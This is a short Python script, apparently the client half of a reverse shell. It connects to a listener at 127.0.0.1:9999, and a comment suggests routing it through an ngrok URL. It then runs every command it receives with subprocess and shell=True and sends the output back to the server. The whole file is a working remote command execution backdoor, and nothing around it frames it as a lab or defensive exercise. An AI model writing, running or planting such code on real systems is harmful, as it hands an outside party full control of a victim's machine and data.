import socket
import subprocess

# Connect to the server (localhost or through ngrok URL)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 9999)) 

while True:
    # Receive the command from the server
    command = client.recv(1024).decode()

    if command.lower() == 'exit':
        print("Server has ended the connection, bye.")
        break

    # Execute the command on the client's machine
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        client.send(output)  # Send the output back to the server
    except subprocess.CalledProcessError as e:
        client.send(e.output)  # Send the error output to the server

client.close()
